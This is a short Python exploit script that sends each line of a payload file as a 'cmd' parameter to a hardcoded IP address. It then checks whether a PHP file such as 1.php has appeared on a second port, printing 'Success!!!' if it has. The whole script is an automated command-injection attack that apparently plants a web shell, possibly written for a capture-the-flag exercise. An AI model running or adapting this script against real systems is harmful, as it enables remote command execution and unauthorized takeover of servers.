
import requests 

url = "http://142.93.209.130:8003/?cmd={0}"

with open("payload.txt","r") as f:
        for i in f:
                print("[*]" + url.format(i.strip()))
                requests.get(url.format(i.strip())) 

test = requests.get("http://142.93.209.130:8002/1.php")
if test.status_code == requests.codes.ok:
        print("Success!!!")
